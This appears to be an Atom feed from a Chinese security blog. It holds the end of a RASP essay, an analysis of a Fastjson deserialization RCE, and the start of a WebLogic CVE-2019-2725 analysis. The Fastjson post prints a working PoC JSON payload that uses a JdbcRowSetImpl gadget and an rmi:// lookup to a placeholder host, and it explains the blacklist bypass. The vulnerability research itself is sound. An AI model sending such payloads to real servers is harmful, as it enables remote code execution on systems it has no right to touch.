总结</h1><p>就目前来说RASP解决方案已经相对成熟，除非JDK出现新的特性，否则很难出现重大的革新。</p><p>目前各家RASP厂商主要都是针对性能及其他的辅助功能进行开发和优化，比如OpenRASP提出了用RASP构建SIEM以及实现被动扫描器的思路，这其实是一个非常好的思路，RASP配合被动扫描器能很方便的对企业内部的资产进行扫描，从而实现一定程度上的漏洞管控。</p><p>但是RASP不是万能的，并不能高效的防御所有的漏洞，其优劣势是非常明显的，应当正确的理解RASP本身的司职联合其他的防御措施构建完整的防御体系才能更好的做好安全防护。</p><p>个人认为RASP的最佳实践场所是甲方内部，甲方可以通过资产梳理对不同的系统进行相应的流量管控，这样RASP就能大大减少泛性检测所带来的的误报，同时更进一步的增加应用的安全性。</p><p>总体来说RASP是未来Web应用安全防护的方向，也同时是一个Web安全的发展趋势，其相较于传统安全防护产品的优势是不言而喻的，只要解决泛用性、稳定性、部署难等问题，可以说是目前能想出的一种较为理想方案了。</p><h1 id="0x07-Reference"><a href="#0x07-Reference" class="headerlink" title="0x07 Reference"></a>0x07 Reference</h1><ul><li><a href="https://asm.ow2.io/asm4-guide.pdf" target="_blank" rel="noopener">https://asm.ow2.io/asm4-guide.pdf</a></li><li><a href="https://github.com/anbai-inc/javaweb-expression" target="_blank" rel="noopener">https://github.com/anbai-inc/javaweb-expression</a></li><li><a href="https://github.com/Lucifaer/head_first_javarasp/tree/el_expression_hook" target="_blank" rel="noopener">https://github.com/Lucifaer/head_first_javarasp/tree/el_expression_hook</a></li><li><a href="https://zeroturnaround.com/software/jrebel/" target="_blank" rel="noopener">https://zeroturnaround.com/software/jrebel/</a></li><li><a href="https://github.com/spring-projects/spring-loaded" target="_blank" rel="noopener">https://github.com/spring-projects/spring-loaded</a></li><li><a href="https://github.com/baidu/openrasp" target="_blank" rel="noopener">https://github.com/baidu/openrasp</a></li><li><a href="https://rasp.baidu.com/doc/" target="_blank" rel="noopener">https://rasp.baidu.com/doc/</a></li><li><a href="http://www.fanyilun.me/2017/07/18/%e8%b0%88%e8%b0%88Java%20Intrumentation%e5%92%8c%e7%9b%b8%e5%85%b3%e5%ba%94%e7%94%a8/" target="_blank" rel="noopener">http://www.fanyilun.me/2017/07/18/%e8%b0%88%e8%b0%88Java%20Intrumentation%e5%92%8c%e7%9b%b8%e5%85%b3%e5%ba%94%e7%94%a8/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇将近一个月对rasp的研究成果进行汇总，具体讨论RASP的优劣势以及一些个人的理解和看法。&lt;/p&gt;
    
    </summary>
    
      <category term="安全研究" scheme="https://lucifaer.com/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="安全研究" scheme="https://lucifaer.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson 流程分析及RCE分析</title>
    <link href="https://lucifaer.com/2019/07/24/Fastjson%20%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E5%8F%8ARCE%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2019/07/24/Fastjson 流程分析及RCE分析/</id>
    <published>2019-07-24T03:46:00.000Z</published>
    <updated>2019-07-24T03:47:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实最近爆出的这个rce在去年的时候就有更新，poc在github的<a href="https://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66" target="_blank" rel="noopener">commit记录</a>中也有所体现，之前已经有很多非常好的分析文章对整个漏洞进行了详尽的分析，我这里只记录一下自己的跟踪过程，以及在跟踪时所思考的一些问题。</p><a id="more"></a><h1 id="0x01-Fastjson化流程简述"><a href="#0x01-Fastjson化流程简述" class="headerlink" title="0x01 Fastjson化流程简述"></a>0x01 Fastjson化流程简述</h1><p>在<a href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">廖大2017年的一篇博文中</a>就对Fastjson的反序列化流程进行了总结：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15632616584384.jpg" alt=""></p><p>在具体的跟进中也可以很清晰的看到如图所示的架构。</p><p>对于编程人员来说，只需要考虑Fastjson所提供的几个静态方法即可，如：</p><ul><li>JSON.toJSONString()</li><li>JSON.parse()</li><li>JSON.parseObject()</li></ul><p>并不需要关注json序列化及反序列化的过程。深入Fastjson框架，可以看到其主要的功能都是在<code>DefaultJSONParser</code>类中实现的，在这个类中会应用其他的一些外部类来完成后续操作。<code>ParserConfig</code>主要是进行配置信息的初始化，<code>JSONLexer</code>主要是对json字符串进行处理并分析，反序列化在<code>JavaBeanDeserializer</code>中处理。</p><p>在真实的调试过程中会遇到一些非常好玩的问题，而在其它文章中并没有对这些进行完整的叙述，我这里结合自己的理解来说一说。以下的调试的例子的demo为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15634434027169.jpg" alt=""></p><p>jsonString即为poc的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://asdfasfd/&quot;,&quot;autoCommit&quot;:true&#125;&#125;,age:11&#125;</span><br></pre></td></tr></table></figure><p>poc（或者不如说是对于传入的json字符串）的处理过程简单来说分为这几部分:</p><ol><li><code>DefaultJSONParser</code>的初始化</li><li>这一步看是<code>parseObject()</code>是否指定了第二个参数，也就是是否指定了<code>clazz</code>字段：<ul><li>如果指定了<code>clazz</code>字段，则首先根据<code>clazz</code>类型来获取相应<code>deserializer</code>，如果不是<code>initDeserializers</code>中的类的话，则会调用<code>JavaBeanDeserializer#deserialze</code>转交<code>FastjsonASMDeserializer</code>利用Fastjson自己实现的ASM流程生成处理类，调用相应的类并将处理流程转交到相应的处理类处理json字符串内容。（这里的描述有一些些问题，后面会尽量相近的描述一下）</li><li>如果未指定，则直接交给<code>StringCodec</code>类来处理json字符串。</li></ul></li><li>最终都转交由<code>DefaultJSONParser#parse</code>中根据<code>lexer.token</code>来选择处理方式，这里的例子中都为12也就是<code>{</code>（因为要处理json字符串需要一个起始标志位，所以判断当前json字符串的token是很重要的），接下来就是对json字符串进行处理（这里是一个循环处理，摘取类似<code>&quot;name&quot;:&quot;123&quot;</code>这样的关系）。</li><li>判断解析的json字符串中是否存在<code>symbolTable</code>中的字段（如<code>@type</code>，<code>$ref</code>这样的字段），如果出现了<code>@type</code>则交由<code>public final Object parseObject(final Map object, Object fieldName)</code>来处理，然后重复步骤2的过程知道执行成功或报错。</li></ol><h2 id="1-1-DefaultJSONParser的初始化过程"><a href="#1-1-DefaultJSONParser的初始化过程" class="headerlink" title="1.1 DefaultJSONParser的初始化过程"></a>1.1 DefaultJSONParser的初始化过程</h2><p>初始化过程非常的简单，分两部分，一部分为<code>ParserConfig</code>的初始化，另外一部分为<code>DefaultJSONParser</code>的初始化。</p><p><code>ParserConfig</code>的初始化是在<code>com.alibaba.fastjson.JSON</code>中调用的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15634458216861.jpg" alt=""></p><p>一路跟到<code>ParserConfig#ParserConfig</code>方法中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15634459216772.jpg" alt=""></p><p>前面指定了asm的工厂类，并进行了实例化，后面是初始化<code>deserializers</code>，将用户自定义黑白名单加入到原有的黑白名单中。</p><p><code>DefaultJSONParser</code>的初始化是在<code>com.alibaba.fastjson.JSON#parseObject</code>中调用并完成的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15635037373216.jpg" alt=""></p><p>这里初始化了<code>DefaultJSONParser</code>之后调用了其<code>parseObject</code>方法进行后续的操作。</p><p>跟进<code>DefaultJSONParser</code>可以看到<code>JSONScanner</code>的实例化以及<code>lexer.token</code>的初始化设置：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15635040214840.jpg" alt=""></p><h2 id="1-2-获取对应的derializer"><a href="#1-2-获取对应的derializer" class="headerlink" title="1.2 获取对应的derializer"></a>1.2 获取对应的derializer</h2><p>进入到这里步就稍微有点复杂了，需要仔细跟进一下。根据上一节我们可以看到完成初始化操作后主要的处理流程集中于<code>T value = (T) parser.parseObject(clazz, null);</code>这一步的操作中，跟进看一下具体流程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15635048199979.jpg" alt=""></p><p>简单来说就是一个根据type获取对应的<code>derializer</code>并且调用<code>derializer.deserialze</code>进行处理的过程，这里的config是之前初始化的<code>ParserConfig</code>。这里要注意的是<code>type</code>这个参数，跟踪了整个流程后会发现，如果在写代码时指定了第二个参数如<code>Group group = JSON.parseObject(jsonString, Group.class);</code>则第二个参数也就是<code>Group.class</code>即为<code>type</code>如果未指定第二个参数的话将会获取第一个参数的类型作为<code>type</code>，当未指定第二个参数的时候将会调用与第一个参数类型相符的方法来处理：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15635051429391.jpg" alt=""></p><p>了解了这些后，就可以跟进看一下<code>getDeserializer</code>的实现了：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15635054724803.jpg" alt=""></p><p>首先会尝试在<code>deserializers</code>中匹配<code>type</code>的类型，如果匹配到了就返回匹配的<code>derializer</code>，否则就判断是否是Class泛型的接口，如果是则调用<code>getDeserializer((Class&lt;?&gt;) type, type)</code>继续处理，这一部分代码很长，我只截最关键的一个地方：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15635059273625.jpg" alt=""></p><p>当类不显式匹配上面的情况时，就会调用<code>createJavaBeanDeserializer</code>来创建一个新的<code>derializer</code>，并将其加入到<code>deserializers</code>这个map中。接下来跟进<code>createJavaBeanDeserializer</code>的处理流程，我截取了关键的一部分：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15635087510896.jpg" alt=""></p><p>在这里首先会根据类名和propertyNamingStrategy生成beanInfo，之后利用asm工厂类的<code>createJavaBeanDeserializer</code>生成处理类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15635176083297.jpg" alt=""></p><p>写过asm的应该可以一眼看出这里是用asm来生成处理类，分别生成构造函数，<code>deserialze</code>方法和<code>deserialzeArrayMapping</code>方法。我们来看一下asm生成的类是什么样的。这里由于代码很多我只截取一些关键的地方：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15635245722181.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15635246119833.jpg" alt=""></p><p>至此便完成了利用asm生成处理类的过程了。</p><h2 id="1-3-处理类的处理流程"><a href="#1-3-处理类的处理流程" class="headerlink" title="1.3 处理类的处理流程"></a>1.3 处理类的处理流程</h2><p>上一节中我们已经动态生成了<code>FastjsonASMDeserializer_1_Group</code>这个处理类，那么现在可以继续向下跟进，看看后续的处理流程是怎么样的。</p><p>首先，跟进一下构造函数：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637791190484.jpg" alt=""></p><p>这里利用<code>createFieldDeserializer</code>将<code>type</code>类中的变量等信息转换为<code>FieldDeserializer</code>类型，并存储到<code>sortedFieldDeserializers</code>这个数组中，这里可以记一下这个数组的名字，后面会用到：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637794784848.jpg" alt=""></p><p>在完成构造函数后，根据上文的跟踪，就会调用asm生成的处理类中的<code>deserialze</code>方法，由于我这里是把生成的bytecode抓下来写成文件来看的，所以很多东西看的不是很清晰，但是整段处理的关键点在于最后的return：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637804297401.jpg" alt=""></p><p>其中的各个参数为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637805043654.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637805171733.jpg" alt=""></p><p>跟进<code>parseRest</code>来看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637805586077.jpg" alt=""></p><p>这里直接调用了<code>JavaBeanDeserializer#deserialze</code>。这里我截取几处比较关键的代码：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637623603918.jpg" alt=""></p><p>这里需要注意的有两个变量：<code>beanInfo</code>和<code>sortedFieldDeserializers</code>，这两个变量的生成过程上文都有提及，根据这两个变量的值，我们能很好的理解<code>JavaBeanDeserializer#deserialze</code>这部分的代码，这里会遍历整个<code>sortedFieldDeserializers</code>中所有的key，并尝试根据类型来提取jsonstring中相应的信息，如果成功则转交给asm生成的处理类的createInstance实例化对象，如果不成功则扫描jsonstring中是否具有特殊的指令集，如果有，则尝试解析指令集否则就报错。下面具体看一下处理的流程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637646961397.jpg" alt=""></p><p>如果失败则尝试解析指令集：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637647820704.jpg" alt=""></p><p>可以看到这里会尝试解析<code>$ref</code>和<code>@type</code>，如果匹配到了<code>@type</code>且其内容为string，则尝试利用<code>lexer.stringVal()</code>通过字符串截取来获取其内容：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637677118755.jpg" alt=""></p><p>但是由于我们发送的jsonstring中是没有与<code>sortedFieldDeserializers</code>所对应的键名的，所以这里仍无法匹配到。因为没有办法找到与设定的type相符的键，这个时候获取到的内容为空，fastjson会将当前这个字段判断为一个键值，根据当前符号的下一个符号来判断这个键所对应的值是什么类型，如果是<code>{</code>则这个键所对应的值也是一个key-value的格式，如果是<code>&quot;</code>则为具体的值。在当前例子中，我们知道下一个字段应为<code>{</code>，fastjson在处理时会再次调用<code>parseObject</code>来处理这个新的键值对格式，下面便是如何将处理流程转交<code>parserObject</code>进行二次处理的过程。这里需要用到<code>FieldDeserializers</code>来进行解析了：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637845085529.jpg" alt=""></p><p>跟进<code>parseField</code>中，关键的处理流程为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637846769606.jpg" alt=""></p><p>继续跟进：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637864059970.jpg" alt=""></p><p>这里首先通过<code>fieldInfo.fieldClass</code>和<code>fieldInfo.fieldType</code>来获取<code>fieldValueDeserilizer</code>由于这里对应的jsonstring是string类型，则这里最后获取到的<code>fieldValueDeserilizer</code>是<code>StringCodec</code>。所以接下来就是跟进<code>StringCodec#deserialze</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637866580518.jpg" alt=""></p><p>传入的clazz应为String类型，而非StringBuffer或StringBuilder，所以继续跟进<code>deserialze</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637867685448.jpg" alt=""></p><p>最终调用<code>DefaultJSONParser#parse</code>解析jsonstring：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637869899788.jpg" alt=""></p><p>现在解析的位置应为<code>{</code>所对应的的token，所以应为12，也就是LBRACE，这里将调用<code>parseObject</code>来对jsonstring进行解析，我这里截取关键部分：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637874209660.jpg" alt=""></p><p>在这段代码的前面都是lexer对jsonstring的截取和处理操作，当检测到jsonstring中含有以<code>@type</code>为键名的字段后，获取其值，将值传入<code>checkAutoType</code>中做长度检测以及黑白名单的检测:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15637894807845.jpg" alt=""></p><p>如果通过的话，则调用<code>config.getDeserializer</code>获取clazz的类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15638726459493.jpg" alt=""></p><p>根据jsonstring中的<code>val</code>字段来获取obj的值：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15638759463114.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15638760602976.jpg" alt=""></p><p>这里将<code>objVal</code>的名称以字符串的形式赋值给<code>strVal</code>。后面会根据<code>clazz</code>的类型将处理流程转交给不同的流程这里由于指定了<code>java.lang.class</code>所以是转交到<code>TypeUtils.loadClass</code>来处理的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15638761943245.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15638765180910.jpg" alt=""></p><p>前面将对传入的<code>className</code>进行解析，如果符合相应格式就会进行相应的解析（这里也是之前漏洞所在地），而后面的则会判断<code>cache</code>是否为<code>true</code>，如果为真则将实例化后的类加入到mappings中（这也是这次漏洞的核心），最终都将把实例化后的类进行返回。</p><h1 id="0x02-Fastjson-gadget流程"><a href="#0x02-Fastjson-gadget流程" class="headerlink" title="0x02 Fastjson gadget流程"></a>0x02 Fastjson gadget流程</h1><p>其实在前文都有涉及，在这里将化繁为简，总结一下关键点在哪几个地方。</p><h2 id="2-1-jsonstring解析简述"><a href="#2-1-jsonstring解析简述" class="headerlink" title="2.1 jsonstring解析简述"></a>2.1 jsonstring解析简述</h2><p>纵观整个Fastjson的处理流程，可以注意到对jsonstring的核心处理流程是在<code>DefaultJSONParser#parse(Object fieldName)</code>中根据jsonstring的标志位来进行分发的，常见有两种情况：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 正常的kv结构</span><br><span class="line">&#123;<span class="attr">"k"</span>:<span class="string">"v"</span>&#125;</span><br><span class="line"></span><br><span class="line"># 嵌套结构</span><br><span class="line">&#123;"k":&#123;"kk":"vv","kk":"vv"&#125;,"k":&#123;"k":"kk","kk":"vv","kk":"vv"&#125;&#125;,k:v&#125;</span><br></pre></td></tr></table></figure><p>而Fastjson的解析方式会首先判断当前标志位是什么，这里拿完整的解析过程来举个例子：</p><p>最开始解析的标志位为<code>{</code></p><ol><li>判断下一个标志位是否为<code>&quot;</code>，如果是<code>&quot;</code>则提取key值，这时的标志位为<code>&quot;</code>。</li><li>判断下一个标志位是否为<code>:</code>：   <ul><li>如果为<code>:</code>则判断下一个标志位是否为<code>&quot;</code>，如果是，则获取value值，这时的标志位为<code>&quot;</code>。</li><li>如果为<code>{</code>则重复1、2的过程。</li></ul></li><li>判断下一个标志位是否为<code>}</code>：<ul><li>如果为<code>}</code>则表示这一个单元的解析结束</li><li>如果为<code>,</code>则表示要解析下一个kv的数据，重复1、2、3</li></ul></li></ol><p>根据不同的标志位进行不同的解析。当解析的过程中碰到了<code>@type</code>或<code>$ref</code>时，将当做特殊的标志做相应的处理。</p><h2 id="2-2-checkAutoType黑名单检测"><a href="#2-2-checkAutoType黑名单检测" class="headerlink" title="2.2 checkAutoType黑名单检测"></a>2.2 checkAutoType黑名单检测</h2><p>当解析过程中找到了<code>@type</code>这个关键的标志时，将提取其所对应的值，并检测这个值是否在黑名单中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15639372531112.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15639373476871.jpg" alt=""></p><p>先过黑名单再过白名单，这样保证了<code>@type</code>所引用的类是较为安全的。</p><h2 id="2-3-deserialze流程"><a href="#2-3-deserialze流程" class="headerlink" title="2.3 deserialze流程"></a>2.3 deserialze流程</h2><p>jsonstring经过解析且经过安全性验证后，最终都要变成相应的对象，而变成对象的过程就是利用反射完成的，这个过程就是反序列化的过程。而该过程主要在<code>DefaultJSONParser#parseObject</code>中调用<code>deserializer.deserialze()</code>完成：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15639376459381.jpg" alt=""></p><p>这里会根据<code>@type</code>所指定的类来获取或生成反序列化类，完成反序列化过程，这里如果是在预定数组中的类的话就可以直接调用相关类的<code>deserialze</code>方法完成反序列化操作：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15639378099065.jpg" alt=""></p><p>如果没有则会进入asm创建处理类的流程。</p><h2 id="2-4-gadget执行的关键——反射调用"><a href="#2-4-gadget执行的关键——反射调用" class="headerlink" title="2.4 gadget执行的关键——反射调用"></a>2.4 gadget执行的关键——反射调用</h2><p>在具体进行反射前还有一个操作，将会解析看jsonstring中是否存在<code>val</code>字段，如果有，则将其提取出来赋给<code>objVal</code>，并将<code>objVal</code>的类名赋值给<code>strVal</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15639380276367.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15639381411285.jpg" alt=""></p><p>之后根据<code>clazz</code>类型交由不同的流程来处理：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15639380718416.jpg" alt=""></p><p>当<code>clazz</code>是一个class类型时，就会进入<code>TypeUtils.loadClass</code>中根据<code>strVal</code>进行类调用:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15639387445134.jpg" alt=""></p><p>这里有两个点需要注意，而这两个点就是造成Fastjson两个rce的关键点。</p><ul><li>第一个点会对传入的<code>@type</code>的值进行解析，如果符合相应的格式则直接进行类加载。</li><li><p>第二个点首先会反射调用<code>@type</code>的值所设置的类，然后将其加入到mappings中，当后面再次经过<code>checkAutoType</code>时，将会调用：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2019/07/24/15639392180790.jpg" alt=""></p></li></ul><p>将首先从mappings中获取和<code>typeName</code>相同的类，也就是说这里在进行黑名单检测前就已经返回了类，从而绕过了黑名单。</p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>就目前来说，针对Fastjson的攻防集中于对于<code>@type</code>的检测的利用以及黑名单的绕过这两部分。而从整体的运行逻辑上来看，由于Fastjson很多地方写的比较死，很难出现重新调用构造方法覆盖黑名单或者覆盖mapping的操作，所以就现在最新版的Fastjson而言是比较难以绕过防护措施的。</p><p>未来可以参考struts2 ognl的攻防手法，看是否能从置空黑名单或者操作mappings来尝试绕过防护。</p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66</a></li><li><a href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实最近爆出的这个rce在去年的时候就有更新，poc在github的&lt;a href=&quot;https://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;commit记录&lt;/a&gt;中也有所体现，之前已经有很多非常好的分析文章对整个漏洞进行了详尽的分析，我这里只记录一下自己的跟踪过程，以及在跟踪时所思考的一些问题。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="FastJson" scheme="https://lucifaer.com/tags/FastJson/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic wls9-async组件RCE分析（CVE-2019-2725）</title>
    <link href="https://lucifaer.com/2019/05/10/WebLogic%20wls9-async%E7%BB%84%E4%BB%B6RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-2725%EF%BC%89/"/>
    <id>https://lucifaer.com/2019/05/10/WebLogic wls9-async组件RCE分析（CVE-2019-2725）/</id>
    <published>2019-05-10T10:41:00.000Z</published>
    <updated>2019-05-10T10:41:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个洞在五一前就完成了分析，后面的时间就在寻找好用的利用链和绕最新的补丁方法。本来是想等着这波热度过去后，学一下其他人是否有更好的利用手法，结果发现大多数人用的还是rmi或者jdk7的gadget（稍有些遗憾）…</p><p>这篇主要是来记录一下分析过程中一些比较关键的点，以及把自己找的一些利用链分享一下。其实是想等自己绕过最新补丁后再写一写绕补丁的想法的，结果经过快一周的研究，没整出来…后面一篇会把截止到目前我的一些绕补丁的思路总结下来，前面这篇就算是做一个基础铺垫了。在分析和挖掘的过程中特别感谢orich1、Badcode、Bearcat老哥们的交流与帮助。</p><a id="more"></a><h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15565072433448.jpg" alt="-w685"></p><p>从漏洞描述中可以看出这个漏洞是<code>wls9_async_response</code>包的一个反序列化漏洞，并且走的是http协议，而从暂时的修补措施中可以推测是需要向<code>/_async/</code>路径发送一个http包：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15565073987282.jpg" alt="-w683"></p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>这个洞比较有意思的一点在于利用而不是分析，所以我只是把调用栈列出来，并说说自己是怎么调这个漏洞的。</p><h2 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HttpServlet$service:269</span><br><span class="line">  BaseWSServlet$service:163</span><br><span class="line">  BaseWSServlet$run:316</span><br><span class="line">  SoapProcessor$process:28</span><br><span class="line">  SoapProcessor$handlePost:45</span><br><span class="line">    WsSkel$invoke:58</span><br><span class="line">      ServerDispatcher$dispatch:93</span><br><span class="line">        HandlerIterator$handleRequest:82</span><br><span class="line">          WorkAreaServerHandler$handleRequest:32</span><br><span class="line">            WorkContextMapImpl$receiveRequest:142</span><br><span class="line">              WorkContextLocalMap$receiveRequest:165</span><br><span class="line">                WorkContextEntryImpl$readEntry:72</span><br><span class="line">                  WorkContextXmlInputAdapter$readUTF:104</span><br></pre></td></tr></table></figure><h2 id="调试的方法"><a href="#调试的方法" class="headerlink" title="调试的方法"></a>调试的方法</h2><p>至于怎么开远程调试之类的就不在这里赘述了，我说说在调的时候是怎么下断的，这个我觉得还是比较重要的。</p><p>刚拿到漏洞简述的时候以为是<code>wls9_async_response</code>这个包的问题，进去看了看发现并不是：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15573060600990.jpg" alt=""></p><p>里面并没有什么解析过程，更像是处理响应包的过程。但是里面还是有一些让我留意的东西的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15573062394220.jpg" alt=""></p><p>可以看到这里绑定了作用域等信息，同时也绑定了soap的一些设置，既然这里并非漏洞的触发地，那漏洞是否可能是在处理请求时所触发的呢？所以我在<code>servlet</code>这边下了个断，跟了下请求的处理过程，接下来我说一下在调试过程中遇到的几个关键点，以及为什么我要这么跟。</p><h2 id="2-1-请求的分派"><a href="#2-1-请求的分派" class="headerlink" title="2.1 请求的分派"></a>2.1 请求的分派</h2><p>请求的分派是在<code>weblogic.wsee.server.servlet.BaseWSServlet#run</code>中完成的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15573101907946.jpg" alt=""></p><p>这里会遍历一个请求处理器的数组，我们注意到这里会把不同的请求按照类型分派给不同的处理器进行处理，而所有的处理器中让我们比较感兴趣的的就是<code>SoapProcessor</code>，因为<code>SOAPXMl</code>可以进行简单的对象访问。</p><h2 id="2-2-责任链处理请求"><a href="#2-2-责任链处理请求" class="headerlink" title="2.2 责任链处理请求"></a>2.2 责任链处理请求</h2><p>责任链的处理在<code>weblogic.wsee.ws.dispatch.server.ServerDispatcher</code>，这里使用轮询的方式将请求根据请求类型分派到不同的处理器中进行处理，具体的分派过程在<code>weblogic.wsee.handler.HandlerIterator</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574728833817.jpg" alt=""></p><h2 id="2-3-漏洞触发点"><a href="#2-3-漏洞触发点" class="headerlink" title="2.3 漏洞触发点"></a>2.3 漏洞触发点</h2><p>触发点在<code>weblogic.wsee.workarea.WorkAreaServerHandler#handleRequest</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574731394552.jpg" alt=""></p><p>跟进<code>receiveRequest</code>，在<code>weblogic.workarea.WorkContextLocalMap#receiveRequest</code>中会对内容进行实体读取：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574733355286.jpg" alt=""></p><p>跟进<code>readEntry</code>：</p><p><img 